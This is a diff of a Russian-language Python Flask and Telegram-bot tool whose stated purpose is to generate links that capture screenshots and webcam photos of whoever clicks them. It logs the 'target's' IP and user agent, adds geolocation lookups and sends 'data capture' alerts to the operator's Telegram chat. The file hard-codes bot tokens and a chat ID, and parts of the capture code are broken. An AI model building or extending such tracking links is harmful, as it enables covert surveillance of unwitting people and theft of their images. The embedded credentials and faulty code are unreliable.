@@ -1,492 +1,2852 @@
 #!/usr/bin/env python3
 """
-Telegram Screenshot Tracker
-Генерация ссылок, которые делают скриншот при переходе
+Сервер для приема скриншотов и фото с камеры с генератором ссылок и авторизацией Telegram
 """
 
+from flask import Flask, request, jsonify, render_template_string, send_from_directory, session, redirect, url_for, make_response
+from flask_session import Session
 import os
-import sys
 import json
-import uuid
+import datetime
+import requests
+from threading import Thread, Lock
+import logging
+import telebot
+from telebot import types
 import time
+import secrets
+import subprocess
+import re
+import sqlite3
+from functools import wraps
+import uuid
+import qrcode
+from io import BytesIO
 import base64
 import hashlib
-from datetime import datetime, timedelta
-from threading import Thread
-import logging
-from io import BytesIO
 
-# Установка логгирования
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+# Настройки
+TELEGRAM_BOT_TOKEN = "8652981173:AAH2ySYacFLhNO_Bx2XqVk6HAFn0AUmnFPQ"  # Токен бота
+SECRET_KEY = "supersecretkey" + str(uuid.uuid4())  # Уникальный ключ
+UPLOAD_FOLDER = "uploads"
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# Проверка зависимостей
-REQUIRED_PACKAGES = [
-    "flask",
-    "requests",
-    "pillow",
-    "pyautogui"
-]
+# База данных
+DB_FILE = "users.db"
 
-try:
-    from flask import Flask, request, redirect, jsonify, render_template_string
-    import requests
-    from PIL import ImageGrab, Image
-    import pyautogui
-    print("✅ Все зависимости установлены")
-except ImportError as e:
-    print(f"❌ Отсутствует зависимость: {e}")
-    print(f"📦 Установите: pip install {' '.join(REQUIRED_PACKAGES)}")
-    sys.exit(1)
-
-# ========== КОНФИГУРАЦИЯ ==========
-class config:
-
-    @property
-    def SCREENSHOTS_DIR(self):
-        return os.path.join(self.CAPTURES_DIR, "screenshots")
-
-    @property
-    def CAMERA_DIR(self):
-        return os.path.join(self.CAPTURES_DIR, "camera")
-
-    # Telegram Bot Token (получите у @BotFather)
-    TELEGRAM_TOKEN = "8413993403:AAFL8-2J4byWxkEwvvTFzuQ05Pcs6ypncn8"
-    
-    # Ваш Telegram ID (узнайте у @userinfobot)
-    TELEGRAM_CHAT_ID = "5782683757"
-    
-    # Настройки сервера
-    SERVER_HOST = "0.0.0.0"  # Для локального использования
-    SERVER_PORT = 8080
-    SERVER_URL = "https://kimberly-refractometric-nonorthographically.ngrok-free.dev"  # Измените на ваш домен
-    
-    # Настройки безопасности
-    LINK_EXPIRE_HOURS = 24  # Ссылка действительна 24 часа
-    SECRET_KEY = "supersecretkey"  # Измените на случайный ключ
-    
-    # НАСТРОЙКИ СКРИНШОТОВ И КАМЕРЫ
-    SCREENSHOT_DELAY = 1  # Задержка перед скриншотом (секунды)
-    CAMERA_DELAY = 1  # Задержка перед захватом камеры
-    SAVE_SCREENSHOTS = True  # Сохранять ли захваченные файлы на диск
-    CAPTURES_DIR = "captures"  # Основная директория для сохранения
-    # Автоматические настройки (не менять)
-    SCREENSHOTS_DIR = os.path.join(CAPTURES_DIR, "screenshots")
-    CAMERA_DIR = os.path.join(CAPTURES_DIR, "camera")
-
-# Автоматические настройки (не менять)
-config = config()
-
-# ========== БАЗА ДАННЫХ (JSON-файл) ==========
-class LinkDatabase:
-    def __init__(self, db_file="links_db.json"):
-        self.db_file = db_file
-        self.links = self._load_db()
-    
-    def _load_db(self):
-        """Загрузка базы данных из JSON файла"""
-        if os.path.exists(self.db_file):
-            try:
-                with open(self.db_file, 'r', encoding='utf-8') as f:
-                    return json.load(f)
-            except:
-                return {}
-        return {}
-    
-    def _save_db(self):
-        """Сохранение базы данных в JSON файл"""
-        try:
-            with open(self.db_file, 'w', encoding='utf-8') as f:
-                json.dump(self.links, f, indent=2, ensure_ascii=False)
-            return True
-        except Exception as e:
-            logger.error(f"Ошибка сохранения БД: {e}")
-            return False
-    
-    def create_link(self, name=None, metadata=None):
-        """Создание новой ссылки"""
-        link_id = str(uuid.uuid4())[:12]
-        
-        link_data = {
-            "id": link_id,
-            "created": datetime.now().isoformat(),
-            "expires": (datetime.now() + timedelta(hours=config.LINK_EXPIRE_HOURS)).isoformat(),
-            "name": name or f"Ссылка {link_id[:8]}",
-            "clicks": 0,
-            "last_click": None,
-            "screenshots": [],
-            "metadata": metadata or {},
-            "active": True
-        }
-        
-        self.links[link_id] = link_data
-        self._save_db()
-        
-        # Генерация URL
-        url = f"{config.SERVER_URL}/track/{link_id}"
-        short_url = f"{config.SERVER_URL}/s/{link_id}"
-        
-        return {
-            "id": link_id,
-            "url": url,
-            "short_url": short_url,
-            "data": link_data
-        }
-    
-    def get_link(self, link_id):
-        """Получение данных ссылки"""
-        return self.links.get(link_id)
-    
-    def record_click(self, link_id, ip_address, user_agent):
-        """Запись перехода по ссылке"""
-        if link_id not in self.links:
-            return False
-        
-        link = self.links[link_id]
-        
-        # Проверка срока действия
-        expires = datetime.fromisoformat(link["expires"])
-        if datetime.now() > expires:
-            link["active"] = False
-            self._save_db()
-            return False
-        
-        # Обновление статистики
-        link["clicks"] += 1
-        link["last_click"] = datetime.now().isoformat()
-        
-        # Запись информации о клике
-        click_data = {
-            "timestamp": datetime.now().isoformat(),
-            "ip": ip_address,
-            "user_agent": user_agent,
-            "screenshot_taken": False
-        }
-        
-        if "clicks_history" not in link:
-            link["clicks_history"] = []
-        
-        link["clicks_history"].append(click_data)
-        
-        # Сохранение
-        self._save_db()
-        
-        return True
-    
-    def record_screenshot(self, link_id, screenshot_data):
-        """Запись информации о скриншоте"""
-        if link_id not in self.links:
-            return False
-        
-        link = self.links[link_id]
-        
-        if "screenshots" not in link:
-            link["screenshots"] = []
-        
-        screenshot_info = {
-            "timestamp": datetime.now().isoformat(),
-            **screenshot_data
-        }
-        
-        link["screenshots"].append(screenshot_info)
-        
-        # Обновляем последний клик
-        if link["clicks_history"]:
-            link["clicks_history"][-1]["screenshot_taken"] = True
-        
-        self._save_db()
-        return True
-    
-    def get_all_links(self):
-        """Получение всех ссылок"""
-        return self.links
-    
-    def delete_link(self, link_id):
-        """Удаление ссылки"""
-        if link_id in self.links:
-            del self.links[link_id]
-            self._save_db()
-            return True
-        return False
-
-# Инициализация базы данных
-db = LinkDatabase()
-
-# ========== ТЕЛЕГРАМ БОТ ==========
-class TelegramNotifier:
-    def __init__(self, token, chat_id):
-        self.token = token
-        self.chat_id = chat_id
-        self.base_url = f"https://api.telegram.org/bot{token}"
-        
-        # Проверка доступности бота
-        self.check_bot()
-    
-    def check_bot(self):
-        """Проверка доступности бота"""
-        try:
-            response = requests.get(f"{self.base_url}/getMe")
-            if response.status_code == 200:
-                bot_info = response.json()
-                logger.info(f"✅ Бот подключен: @{bot_info['result']['username']}")
-                return True
-            else:
-                logger.error(f"❌ Ошибка подключения к боту: {response.status_code}")
-                return False
-        except Exception as e:
-            logger.error(f"❌ Ошибка проверки бота: {e}")
-            return False
-    
-    def send_message(self, text, parse_mode="HTML"):
-        """Отправка текстового сообщения"""
-        try:
-            url = f"{self.base_url}/sendMessage"
-            data = {
-                "chat_id": self.chat_id,
-                "text": text,
-                "parse_mode": parse_mode
-            }
-            response = requests.post(url, data=data)
-            return response.status_code == 200
-        except Exception as e:
-            logger.error(f"Ошибка отправки сообщения: {e}")
-            return False
-    
-    def send_photo(self, photo_bytes, caption=""):
-        """Отправка фото"""
-        try:
-            url = f"{self.base_url}/sendPhoto"
-            
-            # Сохраняем временно в файл
-            temp_file = BytesIO(photo_bytes)
-            temp_file.name = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
-            
-            files = {"photo": temp_file}
-            data = {
-                "chat_id": self.chat_id,
-                "caption": caption
-            }
-            
-            response = requests.post(url, files=files, data=data)
-            return response.status_code == 200
-        except Exception as e:
-            logger.error(f"Ошибка отправки фото: {e}")
-            return False
-    
-    def send_screenshot_notification(self, link_data, ip_address, user_agent, screenshot_path=None):
-        """Отправка уведомления о захвате"""
-        try:
-            # Определяем, что было захвачено
-            captures_count = len(link_data.get("captures", []))
-            screenshot_count = sum(1 for c in link_data.get("captures", []) if c.get("type") == "screenshot")
-            camera_count = sum(1 for c in link_data.get("captures", []) if c.get("type") == "camera")
-        
-            # Текст уведомления
-            text = f"""
-    🎯 <b>НОВЫЙ ЗАХВАТ ДАННЫХ!</b>
-
-    📊 <b>Сводка захвата:</b>
-    • 📸 Скриншотов экрана: {screenshot_count}
-    • 📷 Фото с камеры: {camera_count}
-    • 🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-    👤 <b>Информация о цели:</b>
-    • IP адрес: <code>{ip_address}</code>
-    • User-Agent: {html.escape(user_agent[:80])}...
-
-    🔗 <b>Информация о ссылке:</b>
-    • ID: <code>{link_data['id']}</code>
-    • Название: {html.escape(link_data['name'])}
-    • Всего переходов: {link_data['clicks']}
-
-    🌍 <b>Геолокация:</b>
-    • IPInfo: https://ipinfo.io/{ip_address}
-        """
-        
-        # Добавляем предупреждение о камере
-            if camera_count > 0:
-                text += "\n\n⚠️ <b>ВНИМАНИЕ:</b> Захвачено фото с веб-камеры!"
-        
-            return self.send_message(text)
-        
-        except Exception as e:
-            logger.error(f"Ошибка отправки уведомления: {e}")
-        return False
-    
-# Инициализация телеграм нотификатора
-telegram = TelegramNotifier(config.TELEGRAM_TOKEN, config.TELEGRAM_CHAT_ID)
-
-# ========== СКРИНШОТ УТИЛИТЫ ==========
-class ScreenshotCapturer:
-    @staticmethod
-    def capture_screen():
-        """Захват скриншота экрана"""
-        try:
-            # Задержка перед скриншотом
-            time.sleep(config.SCREENSHOT_DELAY)
-            
-            # Захват скриншота
-            screenshot = ImageGrab.grab()
-            
-            # Конвертация в байты
-            img_byte_arr = BytesIO()
-            screenshot.save(img_byte_arr, format='PNG', quality=85)
-            img_byte_arr.seek(0)
-            
-            return img_byte_arr.getvalue()
-            
-        except Exception as e:
-            logger.error(f"Ошибка захвата скриншота: {e}")
-            return None
-    
-    @staticmethod
-    def save_screenshot(image_bytes, link_id):
-        """Сохранение скриншота на диск"""
-        if not config.SAVE_SCREENSHOTS:  # Изменено с SAVE_CAPTURES
-            return None
-    
-        try:
-            # Создание директории
-            os.makedirs(config.SCREENSHOTS_DIR, exist_ok=True)
-        
-            # Генерация имени файла
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filename = f"{link_id}_{timestamp}.png"
-            filepath = os.path.join(config.SCREENSHOTS_DIR, filename)
-        
-        # Сохранение файла
-            with open(filepath, 'wb') as f:
-                f.write(image_bytes)
-        
-            return filepath
-        
-        except Exception as e:
-            logger.error(f"Ошибка сохранения скриншота: {e}")
-        return None
-
-# ========== КАМЕРА УТИЛИТЫ ==========
-class CameraCapturer:
-    @staticmethod
-    def capture_camera():
-        """Захват фото с веб-камеры"""
-        try:
-            import cv2
-            
-            # Открываем камеру (0 - первая камера)
-            cap = cv2.VideoCapture(0)
-            
-            if not cap.isOpened():
-                logger.warning("⚠️ Веб-камера не найдена или недоступна")
-                return None
-            
-            # Даем камере время на инициализацию
-            time.sleep(1)
-            
-            # Захватываем кадр
-            ret, frame = cap.read()
-            
-            # Освобождаем камеру
-            cap.release()
-            
-            if not ret:
-                logger.warning("⚠️ Не удалось захватить кадр с камеры")
-                return None
-            
-            # Конвертируем BGR (OpenCV) в RGB
-            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-            
-            # Конвертация в байты
-            from PIL import Image
-            img = Image.fromarray(frame_rgb)
-            
-            img_byte_arr = BytesIO()
-            img.save(img_byte_arr, format='JPEG', quality=85)
-            img_byte_arr.seek(0)
-            
-            return img_byte_arr.getvalue()
-            
-        except ImportError:
-            logger.warning("⚠️ OpenCV не установлен. Установите: pip install opencv-python")
-            return None
-        except Exception as e:
-            logger.error(f"Ошибка захвата с камеры: {e}")
-            return None
-    
-    @staticmethod
-    def save_camera_photo(image_bytes, link_id, camera_type="front"):
-        """Сохранение фото с камеры на диск"""
-        if not config.SAVE_SCREENSHOTS:  # Изменено с SAVE_CAPTURES
-            return None
-    
-        try:
-            # Создание директории для камеры
-            os.makedirs(config.CAMERA_DIR, exist_ok=True)
-        
-            # Генерация имени файла
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filename = f"{link_id}_{camera_type}_{timestamp}.jpg"
-            filepath = os.path.join(config.CAMERA_DIR, filename)
-        
-            # Сохранение файла
-            with open(filepath, 'wb') as f:
-                f.write(image_bytes)
-        
-            return filepath
-        
-        except Exception as e:
-            logger.error(f"Ошибка сохранения фото с камеры: {e}")
-        return None
-    
-# ========== FLASK СЕРВЕР ==========
+# Инициализация Flask
 app = Flask(__name__)
-app.secret_key = config.SECRET_KEY
+app.secret_key = SECRET_KEY
+app.config['SESSION_TYPE'] = 'filesystem'
+app.config['SESSION_PERMANENT'] = True  # Постоянные сессии
+app.config['SESSION_USE_SIGNER'] = True
+app.config['SESSION_FILE_DIR'] = './flask_session/'
+app.config['PERMANENT_SESSION_LIFETIME'] = 86400 * 30  # 30 дней
+app.config['SESSION_COOKIE_NAME'] = 'screenshot_tracker_session'
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SECURE'] = False  # True для HTTPS
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 
-# HTML шаблоны
-MAIN_PAGE = """
-<!DOCTYPE html>
+Session(app)
+
+# Инициализация Telegram бота
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+# Глобальные переменные
+NGROK_URL = "https://marquita-unmental-domestically.ngrok-free.dev"  # Ваш фиксированный ngrok URL
+LOCAL_URL = "http://localhost:8080"
+db_lock = Lock()
+LINK_EXPIRY_HOURS = 24
+EXPIRED_LINK_CLEANUP_INTERVAL = 300
+DEMO_SESSION_MINUTES = 10
+LOGIN_CODE_EXPIRE_MINUTES = 10
+DEMO_LINK_EXPIRY_MINUTES = 10
+MOBILE_USER_AGENT_PATTERN = re.compile(r'android|iphone|ipod|ipad|blackberry|iemobile|opera mini|mobile', re.IGNORECASE)
+
+# ========== БАЗА ДАННЫХ ==========
+
+def init_db():
+    """Инициализация базы данных"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        # Таблица пользователей
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
+                chat_id INTEGER UNIQUE,
+                username TEXT,
+                first_name TEXT,
+                last_name TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_login TIMESTAMP,
+                auth_token TEXT UNIQUE,
+                auth_token_expires TIMESTAMP
+            )
+        ''')
+        
+        # Таблица постоянных сессий
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS persistent_sessions (
+                session_id TEXT PRIMARY KEY,
+                user_id INTEGER,
+                user_agent_hash TEXT,
+                ip_address TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+90 days')),
+                FOREIGN KEY (user_id) REFERENCES users (user_id)
+            )
+        ''')
+        
+        # Таблица ссылок
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS links (
+                link_id TEXT PRIMARY KEY,
+                user_id INTEGER,
+                name TEXT,
+                redirect_url TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+24 hours')),
+                clicks INTEGER DEFAULT 0,
+                active BOOLEAN DEFAULT 1,
+                FOREIGN KEY (user_id) REFERENCES users (user_id)
+            )
+        ''')
+        
+        # Таблица кликов
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS clicks (
+                click_id INTEGER PRIMARY KEY AUTOINCREMENT,
+                link_id TEXT,
+                ip TEXT,
+                user_agent TEXT,
+                referer TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (link_id) REFERENCES links (link_id)
+            )
+        ''')
+        
+        # Таблица сессий для входа
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS login_sessions (
+                session_id TEXT PRIMARY KEY,
+                user_id INTEGER,
+                telegram_data TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+1 hour')),
+                FOREIGN KEY (user_id) REFERENCES users (user_id)
+            )
+        ''')
+
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS login_codes (
+                code TEXT PRIMARY KEY,
+                user_id INTEGER,
+                telegram_data TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+10 minutes')),
+                used BOOLEAN DEFAULT 0,
+                FOREIGN KEY (user_id) REFERENCES users (user_id)
+            )
+        ''')
+        
+        # Таблица изображений
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS images (
+                image_id INTEGER PRIMARY KEY AUTOINCREMENT,
+                link_id TEXT,
+                image_type TEXT,
+                session_id TEXT,
+                filename TEXT,
+                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (link_id) REFERENCES links (link_id)
+            )
+        ''')
+        
+        conn.commit()
+        conn.close()
+        print("✅ База данных инициализирована")
+
+def parse_db_timestamp(value):
+    """Безопасный парсер datetime из SQLite."""
+    if not value:
+        return None
+    if isinstance(value, datetime.datetime):
+        return value
+
+    normalized = str(value).replace('T', ' ')
+    try:
+        return datetime.datetime.fromisoformat(normalized)
+    except ValueError:
+        for fmt in ('%Y-%m-%d %H:%M:%S', '%Y-%m-%d %H:%M:%S.%f'):
+            try:
+                return datetime.datetime.strptime(normalized, fmt)
+            except ValueError:
+                continue
+    return None
+
+def is_mobile_request(req=None):
+    """Check whether request most likely comes from a phone browser."""
+    req = req or request
+    user_agent = ''
+    if req is not None:
+        user_agent = req.headers.get('User-Agent', '') or ''
+    return bool(MOBILE_USER_AGENT_PATTERN.search(user_agent))
+
+def is_link_expired(link):
+    """Проверяет, истекла ли ссылка по сроку жизни."""
+    expires_at = parse_db_timestamp(link.get('expires_at')) if link else None
+    return bool(expires_at and expires_at <= datetime.datetime.now())
+
+def collect_link_filenames(cursor, link_id):
+    """Получить имена файлов, связанных со ссылкой."""
+    cursor.execute('SELECT filename FROM images WHERE link_id = ?', (link_id,))
+    return [row[0] for row in cursor.fetchall() if row and row[0]]
+
+def remove_uploaded_files(filenames):
+    """Удаляет физические файлы изображений, если они существуют."""
+    for filename in filenames:
+        filepath = os.path.join(UPLOAD_FOLDER, filename)
+        try:
+            if os.path.exists(filepath):
+                os.remove(filepath)
+        except OSError as exc:
+            print(f"Ошибка удаления файла {filepath}: {exc}")
+
+def delete_link_records(cursor, link_id):
+    """Удаление данных ссылки в рамках одной транзакции."""
+    filenames = collect_link_filenames(cursor, link_id)
+    cursor.execute('DELETE FROM clicks WHERE link_id = ?', (link_id,))
+    cursor.execute('DELETE FROM images WHERE link_id = ?', (link_id,))
+    cursor.execute('DELETE FROM links WHERE link_id = ?', (link_id,))
+    return filenames
+
+def cleanup_expired_links(target_link_id=None):
+    """Удаляет просроченные ссылки и их файлы."""
+    removed_ids = []
+    files_to_remove = []
+
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+
+        if target_link_id:
+            cursor.execute(
+                'SELECT link_id FROM links WHERE link_id = ? AND expires_at <= CURRENT_TIMESTAMP',
+                (target_link_id,)
+            )
+        else:
+            cursor.execute('SELECT link_id FROM links WHERE expires_at <= CURRENT_TIMESTAMP')
+
+        expired_links = [row['link_id'] for row in cursor.fetchall()]
+
+        for link_id in expired_links:
+            files_to_remove.extend(delete_link_records(cursor, link_id))
+            removed_ids.append(link_id)
+
+        conn.commit()
+        conn.close()
+
+    if files_to_remove:
+        remove_uploaded_files(files_to_remove)
+
+    return removed_ids
+
+def cleanup_expired_sessions():
+    """Удаляет просроченные login/persistent сессии и токены."""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM login_sessions WHERE expires_at <= CURRENT_TIMESTAMP')
+        cursor.execute('DELETE FROM login_codes WHERE expires_at <= CURRENT_TIMESTAMP OR used = 1')
+        cursor.execute('DELETE FROM persistent_sessions WHERE expires_at <= CURRENT_TIMESTAMP')
+        cursor.execute(
+            'UPDATE users SET auth_token = NULL, auth_token_expires = NULL WHERE auth_token_expires <= CURRENT_TIMESTAMP'
+        )
+        conn.commit()
+        conn.close()
+
+def background_cleanup_worker():
+    """Фоновая очистка базы и uploads."""
+    while True:
+        try:
+            cleanup_expired_links()
+            cleanup_expired_sessions()
+        except Exception as exc:
+            print(f"Ошибка фоновой очистки: {exc}")
+        time.sleep(EXPIRED_LINK_CLEANUP_INTERVAL)
+
+def get_user_by_chat_id(chat_id):
+    """Получить пользователя по chat_id"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM users WHERE chat_id = ?', (chat_id,))
+        user = cursor.fetchone()
+        conn.close()
+        return dict(user) if user else None
+
+def get_user_by_id(user_id):
+    """Получить пользователя по user_id"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+        user = cursor.fetchone()
+        conn.close()
+        return dict(user) if user else None
+
+def create_or_update_user(chat_id, username, first_name, last_name):
+    """Создать или обновить пользователя"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        # Проверяем существующего пользователя
+        cursor.execute('SELECT user_id FROM users WHERE chat_id = ?', (chat_id,))
+        existing = cursor.fetchone()
+        
+        if existing:
+            # Обновляем существующего
+            cursor.execute('''
+                UPDATE users 
+                SET username = ?, first_name = ?, last_name = ?, last_login = CURRENT_TIMESTAMP
+                WHERE chat_id = ?
+            ''', (username, first_name, last_name, chat_id))
+            user_id = existing[0]
+        else:
+            # Создаем нового
+            cursor.execute('''
+                INSERT INTO users (chat_id, username, first_name, last_name, last_login)
+                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+            ''', (chat_id, username, first_name, last_name))
+            user_id = cursor.lastrowid
+        
+        conn.commit()
+        conn.close()
+        return user_id
+
+def generate_auth_token(user_id):
+    """Генерация токена авторизации"""
+    token = secrets.token_urlsafe(32)
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        expires = datetime.datetime.now() + datetime.timedelta(days=90)
+        cursor.execute('''
+            UPDATE users 
+            SET auth_token = ?, auth_token_expires = ?
+            WHERE user_id = ?
+        ''', (token, expires.isoformat(), user_id))
+        
+        conn.commit()
+        conn.close()
+    return token
+
+def get_user_by_token(token):
+    """Получить пользователя по токену"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT * FROM users 
+            WHERE auth_token = ? AND auth_token_expires > CURRENT_TIMESTAMP
+        ''', (token,))
+        user = cursor.fetchone()
+        conn.close()
+        return dict(user) if user else None
+
+def create_persistent_session(user_id, user_agent, ip_address):
+    """Создать постоянную сессию"""
+    session_id = secrets.token_urlsafe(32)
+    user_agent_hash = hashlib.sha256(user_agent.encode()).hexdigest()[:32]
+    
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO persistent_sessions (session_id, user_id, user_agent_hash, ip_address)
+            VALUES (?, ?, ?, ?)
+        ''', (session_id, user_id, user_agent_hash, ip_address))
+        
+        conn.commit()
+        conn.close()
+    
+    return session_id
+
+def get_persistent_session(session_id):
+    """Получить постоянную сессию"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT ps.*, u.* 
+            FROM persistent_sessions ps
+            JOIN users u ON ps.user_id = u.user_id
+            WHERE ps.session_id = ? AND ps.expires_at > CURRENT_TIMESTAMP
+        ''', (session_id,))
+        result = cursor.fetchone()
+        conn.close()
+        
+        if result:
+            # Обновляем время последнего использования
+            conn = sqlite3.connect(DB_FILE)
+            cursor = conn.cursor()
+            cursor.execute('''
+                UPDATE persistent_sessions 
+                SET last_used = CURRENT_TIMESTAMP
+                WHERE session_id = ?
+            ''', (session_id,))
+            conn.commit()
+            conn.close()
+            
+            return dict(result)
+        return None
+
+def delete_persistent_session(session_id):
+    """Удалить постоянную сессию"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM persistent_sessions WHERE session_id = ?', (session_id,))
+        conn.commit()
+        conn.close()
+
+def create_link(user_id, link_id, name, redirect_url, expires_minutes=None):
+    expires_expression = f'+{expires_minutes} minutes' if expires_minutes is not None else f'+{LINK_EXPIRY_HOURS} hours'
+    """Создать ссылку"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO links (link_id, user_id, name, redirect_url, expires_at)
+            VALUES (?, ?, ?, ?, datetime(CURRENT_TIMESTAMP, ?))
+        ''', (link_id, user_id, name, redirect_url, expires_expression))
+        
+        conn.commit()
+        conn.close()
+
+def get_user_links(user_id):
+    cleanup_expired_links()
+    """Получить все ссылки пользователя"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT * FROM links
+            WHERE user_id = ? AND active = 1 AND expires_at > CURRENT_TIMESTAMP
+            ORDER BY created_at DESC
+        ''', (user_id,))
+        links = cursor.fetchall()
+        conn.close()
+        return [dict(link) for link in links]
+
+def get_link(link_id):
+    cleanup_expired_links(target_link_id=link_id)
+    """Получить ссылку по ID"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT * FROM links
+            WHERE link_id = ? AND active = 1 AND expires_at > CURRENT_TIMESTAMP
+        ''', (link_id,))
+        link = cursor.fetchone()
+        conn.close()
+        return dict(link) if link else None
+
+def increment_clicks(link_id, ip, user_agent, referer):
+    """Увеличить счетчик кликов и записать информацию"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        # Увеличиваем счетчик
+        cursor.execute('UPDATE links SET clicks = clicks + 1 WHERE link_id = ?', (link_id,))
+        
+        # Записываем детали клика
+        cursor.execute('''
+            INSERT INTO clicks (link_id, ip, user_agent, referer)
+            VALUES (?, ?, ?, ?)
+        ''', (link_id, ip, user_agent, referer))
+        
+        conn.commit()
+        conn.close()
+
+def delete_link(user_id, link_id):
+    files_to_remove = []
+    """Удалить ссылку"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        # Проверяем владельца
+        cursor.execute('SELECT user_id FROM links WHERE link_id = ?', (link_id,))
+        link = cursor.fetchone()
+        
+        if link and link[0] == user_id:
+            files_to_remove = delete_link_records(cursor, link_id)
+            conn.commit()
+            success = True
+        else:
+            success = False
+        
+        conn.close()
+        if files_to_remove:
+            remove_uploaded_files(files_to_remove)
+        return success
+
+def create_session(user_id, telegram_data):
+    """Создать временную сессию для входа через Telegram"""
+    session_id = str(uuid.uuid4())
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO login_sessions (session_id, user_id, telegram_data)
+            VALUES (?, ?, ?)
+        ''', (session_id, user_id, json.dumps(telegram_data)))
+        
+        conn.commit()
+        conn.close()
+    return session_id
+
+def create_login_session(user_id, telegram_data):
+    """Создать временную сессию для входа через Telegram"""
+    session_id = str(uuid.uuid4())
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO login_sessions (session_id, user_id, telegram_data)
+            VALUES (?, ?, ?)
+        ''', (session_id, user_id, json.dumps(telegram_data)))
+        
+        conn.commit()
+        conn.close()
+    return session_id
+
+def get_login_session(session_id):
+    """Получить временную сессию входа"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM login_sessions WHERE session_id = ? AND expires_at > CURRENT_TIMESTAMP', (session_id,))
+        sess = cursor.fetchone()
+        conn.close()
+        return dict(sess) if sess else None
+
+def delete_login_session(session_id):
+    """Удалить временную сессию входа"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM login_sessions WHERE session_id = ?', (session_id,))
+        conn.commit()
+        conn.close()
+
+def generate_login_code():
+    """Генерирует короткий код для входа."""
+    alphabet = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
+    return ''.join(secrets.choice(alphabet) for _ in range(6))
+
+def create_login_code(user_id, telegram_data):
+    """Создать одноразовый код входа."""
+    code = generate_login_code()
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM login_codes WHERE user_id = ? OR expires_at <= CURRENT_TIMESTAMP', (user_id,))
